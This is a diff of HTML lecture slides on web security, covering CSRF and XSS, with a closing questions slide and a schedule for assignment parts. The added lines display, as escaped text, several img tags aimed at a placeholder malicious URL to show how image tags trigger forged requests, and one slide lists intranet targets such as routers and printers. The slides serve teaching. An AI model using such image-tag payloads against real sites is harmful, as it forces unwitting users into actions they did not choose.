+&lt;img src="http://malicious-site-wants-to-be-most-visited-site/" &gt;
+&lt;img src="http://malicious-site-wants-to-be-most-visited-site/" &gt;
+&lt;img src="http://malicious-site-wants-to-be-most-visited-site/" &gt;
+&lt;img src="http://malicious-site-wants-to-be-most-visited-site/" &gt;
+&hellip;
+</pre>
+</div>
+<!--
+get sometghin odd to show up in history
+&lquot;Click A Link, Go To Jail&rquot;
+-->
+
+<div>
+<pre class="prettyprint" >
+http://click-a-link/go-to-jail
+</pre>
+</div>
+    </article>
+  </slide>
+
+  <slide class="">
+    <article class="flexbox vcenter">
+	      <h2><span class="uni-red">Intranet</span></h2>
+	      <h3>router &middot; printer &middot; port scanning</h3>
+    </article>
+  </slide>
+
+  <slide class="">
+      <hgroup>
+	      <h2><span class="uni-red">Take-Aways</span></h2>
+      </hgroup>
+    <article class="flexbox vcenter">
+    	<ul>
+		<li>CSRF: forcing a user to perform a sensitive action</li>
+		<li>Unique tokens are a defense</li>
+		<li>XSS can undermine the unique token defense and enable CSRF attacks</li>
 	</ul>
     </article>
   </slide>
 
-  <slide class="">
-    <article class="flexbox vcenter">
-      <h2 style="font-size:2em"><span class="uni-red">Why?</span></h2>
-      <h3>(dolor sit amet)</h3>
-    </article>
-  </slide>
-
-  <slide class="">
-    <article class="flexbox vcenter">
-      <h2 style="font-size:2em"><span class="uni-red">How?</span></h2>
-      <h3>(dolor sit amet)</h3>
-    </article>
-  </slide>
-
-<!--
-  multi-step, semi-blind csr
-  ideas to prevent it
-  * only accept post?
-   * stops simple get based attacks
-   * referrer checking
-    * some users prevent referrer sending due to privacy
-    * techniques to create http reqs without referrers exist
-  * multi-step transactions
-   * csrf can perform each step in order
-   CSRF attacks using image tags are often made from Internet forums, where
-   users are allowed to post images but not JavaScript.
-   -->
-
   <slide class="thank-you-slide segue nobackground">
+    <article class="flexbox vleft">
+      <br /> <br /> 
+
+      <pre class="prettyprint questions" data-lang="javascript" style="margin-left:-15px">
+audience.ask(questions);
+      </pre>
+
+	<br/> <br/> <br/>
+    </article>
+    <p class="auto-fadein" data-config-contact style="display:none;">
+      <!-- populated from slide_config.json -->
+    </p>
+  </slide>
+
+  <slide class="">
+    <article>
+    <br/>
+    <br/>
+    <br/>
+    <center>
+      <table style="width:30% !important;">
+        <tr>
+          <th style="text-align:center;" colspan="2">
+	    Assignments: Structure
+	  </th>
+        </tr>
+	<tr>
+		<td>Part 1</td>
+		<td style="text-align:center">~30 min</td>
+	</tr>
+	<tr>
+		<td>Solutions Part 1&nbsp;&nbsp;</td>
+		<td style="text-align:center">~10 min</td>
+	</tr>
+	<tr>
+		<td colspan="2">&nbsp;</td>
+	</tr>
+	<tr>
+		<td>Part 2</td>
+		<td style="text-align:center">~60 min</td>
+	</tr>
+	<tr>
+		<td>Solutions Part 2</td>
+		<td style="text-align:center">~20 min</td>
+	</tr>
+	</table>
+    </center>
+    </article>
+  </slide>
+
+  <slide class="thank-you-slide segue nobackground hidden">
     <article class="flexbox vleft">
       <h2>Dankesch&ouml;n!</h2>
       <br /> <br /> <br />
 
       <pre class="prettyprint questions" data-lang="javascript" >
-speakername.ask(questions);
+audience.ask(questions);
       </pre>
 
 	<br/> <br/> <br/>
@@ -515,17 +1279,6 @@ speakername.ask(questions);
 
 </slides>
 
-<script>
-var _gaq = _gaq || [];
-_gaq.push(['_setAccount', 'UA-XXXXXXXX-1']);
-_gaq.push(['_trackPageview']);
-
-(function() {
-  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-})();
-</script>
 
 <!--[if IE]>
   <script src="http://ajax.googleapis.com/ajax/libs/chrome-frame/1/CFInstall.min.js"></script>
